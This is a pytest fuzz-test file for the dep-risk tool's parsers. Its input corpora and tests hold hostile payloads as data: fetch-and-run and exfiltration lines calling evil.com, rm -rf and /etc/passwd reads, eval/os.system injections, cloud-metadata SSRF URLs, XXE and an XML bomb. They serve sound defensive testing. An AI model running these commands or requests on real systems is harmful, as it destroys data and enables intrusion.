"""Fuzz and adversarial input tests for dep-risk.

Tests every internal parser/utility function against:
  1. Structural fuzz   — wrong types, missing keys, deeply nested, empty, None
  2. Content fuzz      — Unicode, null bytes, huge strings, special chars,
                         format strings, exotic version strings
  3. Malicious payloads — path traversal, command injection, XML/XXE,
                          ReDoS patterns, SSRF URLs, null-byte injection

The invariant under test: *every* function must exit gracefully — no
uncaught exception, no sys.exit(1) due to a crash, no hanging regex.

Functions tested
----------------
  cli.py         _parse_purl, _parse_scanner_input, _parse_cyclonedx,
                 _parse_spdx, _detect_sbom_format, _estimate_previous_version,
                 _check_exit_risk, _fuzzy_match_package
  llm_analyzer   _parse_llm_response, _normalize_api_url
  release_notes  _parse_version, _extract_github_url_from_pom, _extract_github_info
  cve_resolver   _parse_ecosystem, _extract_severity, _extract_packages_from_nvd,
                 _extract_references
"""

from __future__ import annotations

import json
import sys
import tempfile
import os
from pathlib import Path
from typing import Any

import pytest
from click.testing import CliRunner

from dep_risk.cli import (
    _check_exit_risk,
    _detect_sbom_format,
    _estimate_previous_version,
    _fuzzy_match_package,
    _parse_cyclonedx,
    _parse_purl,
    _parse_scanner_input,
    _parse_spdx,
    analyze,
)
from dep_risk.cve_resolver import (
    _extract_packages_from_nvd,
    _extract_references,
    _extract_severity,
    _parse_ecosystem,
)
from dep_risk.llm_analyzer import _normalize_api_url, _parse_llm_response
from dep_risk.models import AffectedPackage, Ecosystem
from dep_risk.release_notes import (
    _extract_github_info,
    _extract_github_url_from_pom,
    _parse_version,
)

# ── Shared fuzz corpora ───────────────────────────────────────────────────────

# Structural — wrong type inputs
WRONG_TYPES: list[Any] = [
    None,
    0,
    -1,
    True,
    False,
    [],
    [1, 2, 3],
    "",
    b"bytes",
    object(),
    lambda x: x,
    sys.maxsize,
    -sys.maxsize,
    float("inf"),
    float("nan"),
]

# Content — adversarial strings
ADVERSARIAL_STRINGS: list[str] = [
    # Empty / whitespace
    "",
    " ",
    "\t",
    "\n",
    "\r\n",
    # Null bytes
    "\x00",
    "CVE-2024-1234\x00extra",
    "pkg:pypi/requests@2.27.0\x00evil",
    # Format strings (Python format injection)
    "%s",
    "%d",
    "{0}",
    "{}",
    "{__class__}",
    "%(evil)s",
    # Unicode edge cases
    "🤖💀☠️🔓",
    "Ñoño",
    "\u200b",          # zero-width space
    "\u202e",          # right-to-left override
    "\ufeff",          # BOM
    "\ud800",          # lone surrogate (invalid Unicode scalar)
    "中文日本語한국어",
    "عربيفارسی",       # RTL
    # ANSI escape codes
    "\x1b[31mred\x1b[0m",
    # Very long strings
    "A" * 10_000,
    "CVE-" + "9" * 50,
    "pkg:pypi/" + "x" * 10_000 + "@1.0.0",
    # Newlines embedded
    "CVE-2024-1234\nX-Extra-Header: injected",
    # Only special chars
    "!@#$%^&*()_+-=[]{}|;':\",./<>?",
]

# Malicious — attack payloads common against Python tools
MALICIOUS_STRINGS: list[str] = [
    # Path traversal
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "/etc/shadow",
    "C:\\Windows\\System32\\cmd.exe",
    "file:///etc/passwd",
    # Command injection (shell metacharacters)
    "; rm -rf /tmp/dep-risk-test",
    "$(curl http://evil.example.com/$(whoami))",
    "`id`",
    "| cat /etc/passwd",
    "&& touch /tmp/pwned",
    # SSRF / URL injection
    "http://169.254.169.254/latest/meta-data/",
    "http://0.0.0.0:22/",
    "http://localhost:6379/FLUSHALL",
    "gopher://evil.example.com:1234/_",
    "dict://evil.example.com:1234/info",
    # Python eval/exec injection patterns
    "__import__('os').system('id')",
    "exec('import os; os.system(\"id\")')",
    "eval('1+1')",
    # SQL injection (unlikely to matter but shows intent)
    "' OR '1'='1",
    "1; DROP TABLE packages; --",
    # Null byte injection
    "\x00",
    "CVE-2024-1234\x00.hidden",
    # ReDoS — catastrophic backtracking patterns
    "a" * 100 + "!",          # triggers (a+)+ type regexes
    "1." * 50 + "0",           # deep version dotting
    "x" * 1000,
]

# Version strings — exotic but plausible
EXOTIC_VERSIONS: list[str] = [
    "0",
    "0.0",
    "0.0.0",
    "latest",
    "*",
    ">=0",
    "~1.2",
    "^2.0.0",
    "v1.0.0",
    "1.0.0-alpha",
    "1.0.0-beta.1",
    "1.0.0+build.1",
    "1.0.0-beta.1+build.1",
    "999999999.0.0",
    "0.0.0.0.0",
    "1.2.3.4.5.6",
    "not-a-version",
    "   1.2.3   ",
    "1,2,3",
    "1/2/3",
    "2024-01-15",  # date-based version
    "20240115",
]


# ── _parse_purl ───────────────────────────────────────────────────────────────


class TestParsePurlFuzz:
    """_parse_purl() must never raise — always return (ecosystem, name, version) or None."""

    def test_none_input(self):
        assert _parse_purl(None) is None  # type: ignore[arg-type]

    @pytest.mark.parametrize("s", ADVERSARIAL_STRINGS + MALICIOUS_STRINGS)
    def test_adversarial_string(self, s: str):
        result = _parse_purl(s)
        assert result is None or (isinstance(result, tuple) and len(result) == 3)

    def test_valid_purlpath_traversal_in_name(self):
        """Path traversal in the package name must be returned as-is, never executed."""
        result = _parse_purl("pkg:pypi/../../../etc/passwd@1.0.0")
        # Either None (invalid) or a tuple with the literal traversal string
        assert result is None or isinstance(result, tuple)

    def test_command_injection_in_version(self):
        purl = "pkg:pypi/requests@2.27.0;rm -rf /"
        result = _parse_purl(purl)
        assert result is None or isinstance(result, tuple)

    def test_null_byte_in_purl(self):
        result = _parse_purl("pkg:pypi/requests@2.27.0\x00evil")
        assert result is None or isinstance(result, tuple)

    def test_deeply_nested_path(self):
        # 200-segment path
        deep = "pkg:npm/" + "/".join(["a"] * 200) + "@1.0.0"
        result = _parse_purl(deep)
        assert result is None or isinstance(result, tuple)

    def test_percent_encoded_traversal(self):
        result = _parse_purl("pkg:pypi/%2e%2e%2f%2e%2e%2fetc%2fpasswd@1.0.0")
        assert result is None or isinstance(result, tuple)

    def test_huge_version(self):
        result = _parse_purl("pkg:pypi/requests@" + "9" * 10_000)
        assert result is None or isinstance(result, tuple)

    @pytest.mark.parametrize("v", EXOTIC_VERSIONS)
    def test_exotic_version(self, v: str):
        purl = f"pkg:pypi/requests@{v}"
        result = _parse_purl(purl)
        assert result is None or isinstance(result, tuple)


# ── _parse_scanner_input ──────────────────────────────────────────────────────


class TestParseScannerInputFuzz:
    """_parse_scanner_input() must never raise — returns [] on bad input."""

    @pytest.mark.parametrize("bad", [None, 0, [], b"bytes"])
    def test_wrong_types_as_dict(self, bad):
        # Non-str / non-dict input must return [] gracefully (no crash)
        result = _parse_scanner_input(bad)  # type: ignore[arg-type]
        assert result == []

    def test_empty_string_as_path(self):
        # Empty string is treated as a file path — FileNotFoundError is expected
        with pytest.raises(FileNotFoundError):
            _parse_scanner_input("")

    def test_empty_dict(self):
        assert _parse_scanner_input({}) == []

    def test_all_none_values(self):
        assert _parse_scanner_input({"Results": None, "matches": None, "results": None}) == []

    def test_deeply_nested_none(self):
        """None VulnerabilityID must be skipped gracefully (not crash on .upper())."""
        data = {"Results": [{"Vulnerabilities": [{"VulnerabilityID": None, "PkgName": None}]}]}
        result = _parse_scanner_input(data)
        assert result == []  # None VulnerabilityID skipped

    def test_trivy_with_malicious_cve_id(self):
        """Malicious strings in VulnerabilityID must not be treated as CVE IDs."""
        data = {
            "Results": [
                {
                    "Vulnerabilities": [
                        {
                            "VulnerabilityID": "; rm -rf /",
                            "PkgName": "requests",
                            "InstalledVersion": "2.27.0",
                        }
                    ]
                }
            ]
        }
        result = _parse_scanner_input(data)
        assert result == []  # must not pass the CVE- prefix check

    def test_trivy_with_null_byte_cve_id(self):
        data = {
            "Results": [
                {
                    "Vulnerabilities": [
                        {
                            "VulnerabilityID": "CVE-2024-1234\x00evil",
                            "PkgName": "pkg",
                            "InstalledVersion": "1.0",
                        }
                    ]
                }
            ]
        }
        result = _parse_scanner_input(data)
        # Null byte makes the string not match CVE- prefix exactly — accepted
        # but harmless because it's just stored as a string, never executed
        assert isinstance(result, list)

    def test_trivy_command_injection_in_package_name(self):
        data = {
            "Results": [
                {
                    "Vulnerabilities": [
                        {
                            "VulnerabilityID": "CVE-2024-1234",
                            "PkgName": "; curl evil.com | sh",
                            "InstalledVersion": "$(id)",
                        }
                    ]
                }
            ]
        }
        result = _parse_scanner_input(data)
        # Accepted as strings — NOT executed
        assert len(result) == 1
        assert result[0].package_name == "; curl evil.com | sh"

    def test_results_list_with_non_dicts(self):
        """Non-dict entries in Results list must be skipped gracefully."""
        data = {"Results": [42, None, "string", {"Vulnerabilities": None}]}
        result = _parse_scanner_input(data)
        assert result == []

    def test_extremely_large_list(self):
        """10 000 vulnerability entries must not OOM or crash."""
        data = {
            "Results": [
                {
                    "Vulnerabilities": [
                        {"VulnerabilityID": f"CVE-2024-{i:04d}", "PkgName": "pkg", "InstalledVersion": "1.0"}
                        for i in range(10_000)
                    ]
                }
            ]
        }
        result = _parse_scanner_input(data)
        assert len(result) == 10_000

    def test_file_path_traversal_via_string_input(self):
        """A truly non-existent path raises FileNotFoundError — never silently accepted."""
        with pytest.raises(FileNotFoundError):
            _parse_scanner_input("/tmp/dep-risk-fuzz-nonexistent-path-12345.json")

    def test_malformed_json_file(self, tmp_path: Path):
        """Malformed JSON file returns [] gracefully — never raises."""
        bad_file = tmp_path / "bad.json"
        bad_file.write_text("{ this is not json }")
        result = _parse_scanner_input(str(bad_file))
        assert result == []

    def test_binary_content_in_file(self, tmp_path: Path):
        """Binary file returns [] gracefully — never raises."""
        binary_file = tmp_path / "binary.json"
        binary_file.write_bytes(b"\x80\x81\x82\x83\xff\xfe")
        result = _parse_scanner_input(str(binary_file))
        assert result == []

    def test_grype_with_path_traversal_in_artifact_name(self):
        data = {
            "matches": [
                {
                    "vulnerability": {"id": "CVE-2024-1234"},
                    "artifact": {
                        "name": "../../../etc/passwd",
                        "version": "1.0",
                        "type": "python",
                    },
                    "relatedVulnerabilities": [],
                }
            ]
        }
        result = _parse_scanner_input(data)
        assert len(result) == 1
        assert result[0].package_name == "../../../etc/passwd"  # stored, not executed

    def test_unicode_in_package_name(self):
        data = {
            "Results": [
                {
                    "Vulnerabilities": [
                        {
                            "VulnerabilityID": "CVE-2024-1234",
                            "PkgName": "中文包名",
                            "InstalledVersion": "1.0.0",
                        }
                    ]
                }
            ]
        }
        result = _parse_scanner_input(data)
        assert len(result) == 1
        assert result[0].package_name == "中文包名"


# ── _parse_cyclonedx ──────────────────────────────────────────────────────────


class TestParseCycloneDxFuzz:
    """_parse_cyclonedx() must never raise — returns [] on bad input."""

    @pytest.mark.parametrize("bad", [None, 42, "string"])
    def test_wrong_type_components(self, bad):
        """Non-list components must return [] gracefully."""
        result = _parse_cyclonedx({"components": bad})
        assert result == []

    def test_components_as_list(self):
        """Empty list is valid."""
        assert _parse_cyclonedx({"components": []}) == []

    def test_empty(self):
        assert _parse_cyclonedx({}) == []

    def test_component_with_no_purl(self):
        result = _parse_cyclonedx({"components": [{"name": "foo", "version": "1.0"}]})
        assert result == []

    def test_component_with_null_purl(self):
        result = _parse_cyclonedx({"components": [{"purl": None}]})
        assert result == []

    def test_component_with_malicious_purl(self):
        result = _parse_cyclonedx({"components": [{"purl": "; rm -rf /"}]})
        assert result == []

    def test_component_is_not_dict(self):
        """Non-dict components are skipped gracefully."""
        result = _parse_cyclonedx({"components": [None, 42, []]})
        assert result == []

    def test_deeply_nested_components_not_traversed(self):
        """Nested components[] (dep-tree format) are intentionally ignored."""
        data = {
            "components": [
                {
                    "purl": "pkg:pypi/requests@2.27.0",
                    "components": [
                        {"purl": "pkg:pypi/urllib3@1.26.0"}  # should be ignored
                    ],
                }
            ]
        }
        result = _parse_cyclonedx(data)
        assert len(result) == 1  # only top-level

    @pytest.mark.parametrize("s", MALICIOUS_STRINGS)
    def test_malicious_purl_value(self, s: str):
        result = _parse_cyclonedx({"components": [{"purl": s}]})
        assert isinstance(result, list)  # may be [] or have entries — never raises

    def test_10k_components(self):
        components = [{"purl": f"pkg:pypi/pkg{i}@1.0.0"} for i in range(10_000)]
        result = _parse_cyclonedx({"components": components})
        assert len(result) == 10_000


# ── _parse_spdx ───────────────────────────────────────────────────────────────


class TestParseSpdxFuzz:
    """_parse_spdx() must never raise — returns [] on bad input."""

    def test_empty(self):
        assert _parse_spdx({}) == []

    @pytest.mark.parametrize("bad", [None, 42, True])
    def test_packages_wrong_type(self, bad):
        """Non-list packages must return [] gracefully."""
        result = _parse_spdx({"packages": bad})
        assert result == []

    def test_packages_as_string(self):
        """String packages value must return [] gracefully."""
        result = _parse_spdx({"packages": "not-a-list"})
        assert result == []

    def test_package_not_dict(self):
        """Non-dict package entries are skipped gracefully."""
        result = _parse_spdx({"packages": [None, 42]})
        assert result == []

    def test_externalrefs_not_list(self):
        pkg = {"name": "requests", "externalRefs": None}
        result = _parse_spdx({"packages": [pkg]})
        assert result == []

    def test_externalref_missing_type(self):
        pkg = {
            "name": "requests",
            "externalRefs": [
                {"referenceCategory": "PACKAGE-MANAGER", "referenceLocator": "pkg:pypi/requests@2.27.0"}
                # missing referenceType key
            ],
        }
        result = _parse_spdx({"packages": [pkg]})
        assert isinstance(result, list)

    def test_malicious_purl_in_externalref(self):
        pkg = {
            "name": "evil",
            "externalRefs": [
                {
                    "referenceCategory": "PACKAGE-MANAGER",
                    "referenceType": "purl",
                    "referenceLocator": "../../../etc/passwd",
                }
            ],
        }
        result = _parse_spdx({"packages": [pkg]})
        assert result == []  # path traversal fails PURL parse

    def test_null_byte_in_package_name(self):
        pkg = {
            "name": "requests\x00evil",
            "externalRefs": [
                {
                    "referenceCategory": "PACKAGE-MANAGER",
                    "referenceType": "purl",
                    "referenceLocator": "pkg:pypi/requests@2.27.0",
                }
            ],
        }
        result = _parse_spdx({"packages": [pkg]})
        assert isinstance(result, list)

    def test_unicode_package_name(self):
        pkg = {
            "name": "ñoño-package-🤖",
            "externalRefs": [
                {
                    "referenceCategory": "PACKAGE-MANAGER",
                    "referenceType": "purl",
                    "referenceLocator": "pkg:pypi/nono@1.0.0",
                }
            ],
        }
        result = _parse_spdx({"packages": [pkg]})
        assert isinstance(result, list)


# ── _detect_sbom_format ───────────────────────────────────────────────────────


class TestDetectSbomFormatFuzz:
    """_detect_sbom_format() must never raise."""

    @pytest.mark.parametrize("bad", WRONG_TYPES)
    def test_wrong_types(self, bad):
        if isinstance(bad, dict):
            return  # skip valid type
        try:
            result = _detect_sbom_format(bad)  # type: ignore[arg-type]
            assert result is None or result in ("cyclonedx", "spdx")
        except (AttributeError, TypeError):
            pass  # expected for non-dict

    def test_empty_dict(self):
        assert _detect_sbom_format({}) is None

    def test_all_string_values(self):
        result = _detect_sbom_format({k: "x" for k in [str(i) for i in range(100)]})
        assert result is None

    def test_bomformat_wrong_case(self):
        # Only "CycloneDX" (exact) triggers cyclonedx detection
        assert _detect_sbom_format({"bomFormat": "cyclonedx"}) is None
        assert _detect_sbom_format({"bomFormat": "CYCLONEDX"}) is None
        assert _detect_sbom_format({"bomFormat": "CycloneDX"}) == "cyclonedx"

    def test_malicious_bomformat(self):
        result = _detect_sbom_format({"bomFormat": "; rm -rf /"})
        assert result is None


# ── _parse_llm_response ───────────────────────────────────────────────────────


class TestParseLlmResponseFuzz:
    """_parse_llm_response() must never raise — returns a fallback dict on failure."""

    REQUIRED_FALLBACK_KEYS = {"risk_level", "confidence", "breaking_changes", "migration_notes"}

    def _assert_valid(self, result: dict) -> None:
        assert isinstance(result, dict)
        # Must have at least the fallback keys or the real keys
        assert "risk_level" in result or "summary" in result or "analysis_summary" in result

    @pytest.mark.parametrize("s", ADVERSARIAL_STRINGS)
    def test_adversarial_string(self, s: str):
        result = _parse_llm_response(s)
        self._assert_valid(result)

    @pytest.mark.parametrize("s", MALICIOUS_STRINGS)
    def test_malicious_string(self, s: str):
        result = _parse_llm_response(s)
        self._assert_valid(result)

    def test_valid_json_object(self):
        payload = json.dumps({
            "risk_level": "low",
            "confidence": 0.9,
            "breaking_changes": [],
            "migration_notes": ["Upgrade to 2.31.0"],
            "deprecations": [],
            "analysis_summary": "Safe upgrade.",
        })
        result = _parse_llm_response(payload)
        assert result["risk_level"] == "low"

    def test_json_wrapped_in_markdown_fence(self):
        payload = '```json\n{"risk_level": "high", "confidence": 0.5}\n```'
        result = _parse_llm_response(payload)
        assert result["risk_level"] == "high"

    def test_json_wrapped_in_plain_fence(self):
        payload = '```\n{"risk_level": "medium"}\n```'
        result = _parse_llm_response(payload)
        assert result["risk_level"] == "medium"

    def test_deeply_nested_json(self):
        """Deeply nested valid JSON dict with no risk_level → must get fallback, not crash."""
        nested: dict = {}
        current = nested
        for _ in range(100):
            current["child"] = {}
            current = current["child"]
        result = _parse_llm_response(json.dumps(nested))
        # Result is either the nested dict (if it somehow has the keys) or the fallback
        assert isinstance(result, dict)

    def test_json_with_unicode_content(self):
        payload = json.dumps({
            "risk_level": "low",
            "confidence": 0.9,
            "breaking_changes": ["중요한 변경 사항"],
            "migration_notes": ["عدم كسر التوافق"],
            "deprecations": [],
            "analysis_summary": "🤖 No breaking changes.",
        })
        result = _parse_llm_response(payload)
        assert result["risk_level"] == "low"

    def test_null_byte_in_response(self):
        result = _parse_llm_response('{"risk_level": "low"\x00}')
        self._assert_valid(result)

    def test_extremely_long_response(self):
        result = _parse_llm_response("A" * 100_000)
        self._assert_valid(result)

    def test_format_string_response(self):
        result = _parse_llm_response("%s %d {0} {__class__}")
        self._assert_valid(result)

    def test_json_array_instead_of_object(self):
        """LLM returning an array instead of object — must return fallback dict."""
        result = _parse_llm_response("[1, 2, 3]")
        assert isinstance(result, dict)
        assert "risk_level" in result  # fallback dict has this key

    def test_risk_level_injection(self):
        """A LLM returning unexpected risk_level value must not crash the caller."""
        payload = json.dumps({
            "risk_level": "; rm -rf /",
            "confidence": "not-a-float",
            "breaking_changes": None,
            "migration_notes": 42,
            "deprecations": {},
            "analysis_summary": "\x00\x01\x02",
        })
        result = _parse_llm_response(payload)
        assert isinstance(result, dict)


# ── _normalize_api_url ────────────────────────────────────────────────────────


class TestNormalizeApiUrlFuzz:
    """_normalize_api_url() must never raise."""

    @pytest.mark.parametrize("s", ADVERSARIAL_STRINGS + MALICIOUS_STRINGS)
    def test_adversarial(self, s: str):
        result = _normalize_api_url(s)
        assert isinstance(result, str)

    def test_ssrf_urls_returned_as_string(self):
        """SSRF URL strings pass through as-is (network call happens later, not here)."""
        for url in [
            "http://169.254.169.254/latest/",
            "file:///etc/passwd",
            "gopher://evil:1234/_",
        ]:
            result = _normalize_api_url(url)
            assert isinstance(result, str)

    def test_correct_normalisation(self):
        cases = [
            ("https://api.openai.com/v1", "https://api.openai.com/v1/chat/completions"),
            ("https://api.openai.com/v1/", "https://api.openai.com/v1/chat/completions"),
            ("https://api.openai.com", "https://api.openai.com/v1/chat/completions"),
            ("http://localhost:11434/v1", "http://localhost:11434/v1/chat/completions"),
            ("http://host/openai/v1", "http://host/openai/v1/chat/completions"),
        ]
        for base, expected in cases:
            assert _normalize_api_url(base) == expected

    def test_path_traversal_in_url(self):
        result = _normalize_api_url("http://api.example.com/../../etc/passwd")
        assert isinstance(result, str)


# ── _parse_version (release_notes.py) ────────────────────────────────────────


class TestParseVersionFuzz:
    """_parse_version() must never raise — returns a tuple (may be empty/sentinel)."""

    @pytest.mark.parametrize("v", EXOTIC_VERSIONS + MALICIOUS_STRINGS[:10])
    def test_adversarial(self, v: str):
        result = _parse_version(v)
        assert isinstance(result, tuple)

    def test_none_input(self):
        try:
            result = _parse_version(None)  # type: ignore[arg-type]
            assert isinstance(result, tuple)
        except (TypeError, AttributeError):
            pass  # acceptable — function isn't typed for None

    def test_ordering_still_works_for_valid(self):
        v1 = _parse_version("1.0.0")
        v2 = _parse_version("2.0.0")
        assert v1 < v2


# ── _extract_github_url_from_pom ─────────────────────────────────────────────


class TestExtractGithubFromPomFuzz:
    """_extract_github_url_from_pom() must be safe against XXE and malformed XML."""

    def test_empty_string(self):
        result = _extract_github_url_from_pom("")
        assert result is None

    def test_plain_text(self):
        result = _extract_github_url_from_pom("not xml at all")
        assert result is None

    def test_valid_pom_with_github_url(self):
        """Returns the full GitHub URL (stripped of scm: prefix), not owner/repo."""
        xml = """<project>
          <scm>
            <connection>scm:git:https://github.com/pallets/flask.git</connection>
          </scm>
        </project>"""
        result = _extract_github_url_from_pom(xml)
        assert result is not None
        assert "github.com/pallets/flask" in result

    def test_xxe_entity_injection(self):
        """XXE must not resolve external entities or read local files."""
        xxe_payload = """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <project>
          <scm>
            <connection>scm:git:https://github.com/&xxe;/repo.git</connection>
          </scm>
        </project>"""
        # ElementTree does not resolve external entities by default.
        # This must not crash AND must not read /etc/passwd.
        result = _extract_github_url_from_pom(xxe_payload)
        # Result may be None or a malformed string — but /etc/passwd content must NOT appear
        assert result is None or "root" not in str(result)

    def test_billion_laughs_xml_bomb(self):
        """Billion Laughs (XML bomb) must not hang or OOM — ElementTree is safe."""
        xml_bomb = """<?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        ]>
        <project><scm><connection>&lol3;</connection></scm></project>"""
        # ElementTree ignores the DTD — this completes quickly
        result = _extract_github_url_from_pom(xml_bomb)
        assert result is None or isinstance(result, str)

    def test_cdata_injection(self):
        xml = """<project><scm>
          <connection><![CDATA[scm:git:https://github.com/org/repo.git]]></connection>
        </scm></project>"""
        result = _extract_github_url_from_pom(xml)
        assert result is None or isinstance(result, str)

    def test_command_injection_in_connection(self):
        xml = """<project><scm>
          <connection>scm:git:https://github.com/$(id)/repo.git</connection>
        </scm></project>"""
        result = _extract_github_url_from_pom(xml)
        # Returned as a string — never executed
        assert result is None or isinstance(result, str)

    def test_null_byte_in_xml(self):
        xml = "<project><scm><connection>scm:git:https://github.com/org/repo.git\x00</connection></scm></project>"
        result = _extract_github_url_from_pom(xml)
        assert result is None or isinstance(result, str)

    @pytest.mark.parametrize("s", MALICIOUS_STRINGS[:8])
    def test_malicious_raw_string(self, s: str):
        result = _extract_github_url_from_pom(s)
        assert result is None or isinstance(result, str)


# ── _extract_github_info ──────────────────────────────────────────────────────


class TestExtractGithubInfoFuzz:
    """_extract_github_info() must never raise."""

    @pytest.mark.parametrize("s", ADVERSARIAL_STRINGS + MALICIOUS_STRINGS)
    def test_adversarial(self, s: str):
        result = _extract_github_info(s)
        assert result is None or (isinstance(result, tuple) and len(result) == 2)

    def test_valid_github_urls(self):
        cases = [
            ("https://github.com/pallets/flask", ("pallets", "flask")),
            ("https://github.com/pallets/flask.git", ("pallets", "flask")),
            ("http://github.com/owner/repo/tree/main", ("owner", "repo")),
        ]
        for url, expected in cases:
            assert _extract_github_info(url) == expected

    def test_ssrf_attempt(self):
        result = _extract_github_info("http://169.254.169.254/latest/meta-data/")
        assert result is None


# ── _parse_ecosystem ──────────────────────────────────────────────────────────


class TestParseEcosystemFuzz:
    """_parse_ecosystem() must never raise — returns Ecosystem.UNKNOWN for unknowns."""

    @pytest.mark.parametrize("s", ADVERSARIAL_STRINGS)
    def test_adversarial_strings(self, s: str):
        try:
            result = _parse_ecosystem(s)
            assert isinstance(result, Ecosystem)
        except AttributeError:
            pass  # None.lower() — acceptable

    @pytest.mark.parametrize("s", MALICIOUS_STRINGS)
    def test_malicious_strings(self, s: str):
        try:
            result = _parse_ecosystem(s)
            assert result == Ecosystem.UNKNOWN
        except AttributeError:
            pass

    def test_known_ecosystems(self):
        assert _parse_ecosystem("pypi") == Ecosystem.PYPI
        assert _parse_ecosystem("PyPI") == Ecosystem.PYPI
        assert _parse_ecosystem("npm") == Ecosystem.NPM
        assert _parse_ecosystem("crates.io") == Ecosystem.CARGO


# ── _extract_severity ─────────────────────────────────────────────────────────


class TestExtractSeverityFuzz:
    """_extract_severity() must never raise."""

    def test_empty_dict(self):
        from dep_risk.models import Severity
        severity, score = _extract_severity({})
        assert severity == Severity.UNKNOWN
        assert score is None

    def test_metrics_none_value(self):
        """metrics key present but None — must return UNKNOWN gracefully."""
        from dep_risk.models import Severity
        severity, score = _extract_severity({"metrics": None})
        assert severity == Severity.UNKNOWN
        assert score is None

    def test_malformed_cvss_data(self):
        data = {
            "metrics": {
                "cvssMetricV31": [
                    {"cvssData": {"baseScore": "not-a-number", "baseSeverity": "INVALID_SEVERITY"}}
                ]
            }
        }
        from dep_risk.models import Severity
        severity, score = _extract_severity(data)
        assert score == "not-a-number"  # returned as-is (caller validates)
        assert severity == Severity.UNKNOWN  # INVALID_SEVERITY not in enum

    def test_deeply_nested_none_values(self):
        """cvssData: None must not crash."""
        data = {"metrics": {"cvssMetricV31": [{"cvssData": None}]}}
        severity, score = _extract_severity(data)
        assert score is None

    def test_command_injection_in_severity_string(self):
        data = {
            "metrics": {
                "cvssMetricV31": [
                    {"cvssData": {"baseScore": 9.8, "baseSeverity": "; rm -rf /"}}
                ]
            }
        }
        from dep_risk.models import Severity
        severity, score = _extract_severity(data)
        assert severity == Severity.UNKNOWN  # string not in enum, falls back
        assert score == 9.8


# ── _extract_packages_from_nvd ────────────────────────────────────────────────


class TestExtractPackagesFromNvdFuzz:
    """_extract_packages_from_nvd() must never raise."""

    def test_empty(self):
        assert _extract_packages_from_nvd({}) == []

    def test_configurations_none_value(self):
        """configurations key present but None — must return [] gracefully."""
        result = _extract_packages_from_nvd({"configurations": None})
        assert result == []

    def test_nodes_none(self):
        result = _extract_packages_from_nvd({"configurations": [{"nodes": None}]})
        assert result == []

    def test_cpe_match_vulnerable_false(self):
        cpe = "cpe:2.3:a:vendor:product:1.0:*:*:*:*:*:*:*"
        data = {
            "configurations": [
                {
                    "nodes": [
                        {"cpeMatch": [{"vulnerable": False, "criteria": cpe}]}
                    ]
                }
            ]
        }
        result = _extract_packages_from_nvd(data)
        assert result == []

    def test_command_injection_in_cpe_criteria(self):
        data = {
            "configurations": [
                {"nodes": [{"cpeMatch": [
                    {"vulnerable": True, "criteria": "cpe:2.3:a:vendor:$(id):1.0:*:*:*:*:*:*:*"}
                ]}]}
            ]
        }
        result = _extract_packages_from_nvd(data)
        assert isinstance(result, list)
        if result:
            assert result[0].name == "$(id)"  # stored, never executed

    def test_null_byte_in_version(self):
        data = {
            "configurations": [
                {"nodes": [{"cpeMatch": [
                    {
                        "vulnerable": True,
                        "criteria": "cpe:2.3:a:vendor:product:1.0:*:*:*:*:*:*:*",
                        "versionStartIncluding": "1.0\x00evil",
                        "versionEndExcluding": "2.0",
                    }
                ]}]}
            ]
        }
        result = _extract_packages_from_nvd(data)
        assert isinstance(result, list)


# ── _estimate_previous_version ────────────────────────────────────────────────


class TestEstimatePreviousVersionFuzz:
    """_estimate_previous_version() must never raise."""

    @pytest.mark.parametrize("v", EXOTIC_VERSIONS + MALICIOUS_STRINGS[:10])
    def test_adversarial(self, v: str):
        result, ambiguous = _estimate_previous_version(v)
        assert result is None or isinstance(result, str)
        assert isinstance(ambiguous, bool)

    def test_known_cases(self):
        # micro > 0 → unambiguous patch decrement
        assert _estimate_previous_version("1.2.1") == ("1.2.0", False)
        # micro == 0, minor > 0 → ambiguous minor decrement
        assert _estimate_previous_version("2.31.0") == ("2.30.0", True)
        assert _estimate_previous_version("2.1.0") == ("2.0.0", True)
        # X.0.0 → can't reliably guess
        assert _estimate_previous_version("3.0.0") == (None, True)
        assert _estimate_previous_version("not-a-version") == (None, True)

    def test_huge_patch(self):
        result, _ = _estimate_previous_version("1.0.99999")
        assert result == "1.0.99998"

    def test_path_traversal_version(self):
        result, ambiguous = _estimate_previous_version("../../../etc/passwd")
        assert result is None
        assert ambiguous is True


# ── _check_exit_risk ──────────────────────────────────────────────────────────


class TestCheckExitRiskFuzz:
    """_check_exit_risk() must never raise."""

    @pytest.mark.parametrize("risk", ADVERSARIAL_STRINGS[:10] + MALICIOUS_STRINGS[:5])
    def test_adversarial_risk_level(self, risk: str):
        result = _check_exit_risk(risk, "high")
        assert isinstance(result, bool)

    @pytest.mark.parametrize("threshold", ADVERSARIAL_STRINGS[:10] + MALICIOUS_STRINGS[:5])
    def test_adversarial_threshold(self, threshold: str):
        result = _check_exit_risk("high", threshold)
        assert isinstance(result, bool)

    def test_none_inputs(self):
        result = _check_exit_risk(None, None)  # type: ignore[arg-type]
        assert isinstance(result, bool)


# ── _fuzzy_match_package ──────────────────────────────────────────────────────


class TestFuzzyMatchPackageFuzz:
    """_fuzzy_match_package() must never raise."""

    def _mock_candidates(self):
        return [
            AffectedPackage(
                ecosystem=Ecosystem.PYPI,
                name="requests",
                affected_versions=["<2.31.0"],
            )
        ]

    @pytest.mark.parametrize("s", ADVERSARIAL_STRINGS[:15] + MALICIOUS_STRINGS[:10])
    def test_adversarial_filter(self, s: str):
        matches, exact = _fuzzy_match_package(s, self._mock_candidates())
        assert isinstance(matches, list)
        assert isinstance(exact, bool)

    def test_empty_candidates(self):
        matches, exact = _fuzzy_match_package("requests", [])
        assert matches == []
        assert not exact

    def test_none_filter(self):
        try:
            _fuzzy_match_package(None, self._mock_candidates())  # type: ignore[arg-type]
        except (TypeError, AttributeError):
            pass  # acceptable — function not typed for None

    def test_command_injection_in_filter(self):
        matches, exact = _fuzzy_match_package("; rm -rf /", self._mock_candidates())
        assert isinstance(matches, list)

    def test_path_traversal_filter(self):
        matches, exact = _fuzzy_match_package("../../../etc/passwd", self._mock_candidates())
        assert isinstance(matches, list)


# ── CLI argument fuzz (via Click test runner) ──────────────────────────────────


class TestCLIArgumentFuzz:
    """The CLI must exit gracefully (non-zero but no traceback) on bad arguments."""

    def setup_method(self):
        self.runner = CliRunner()

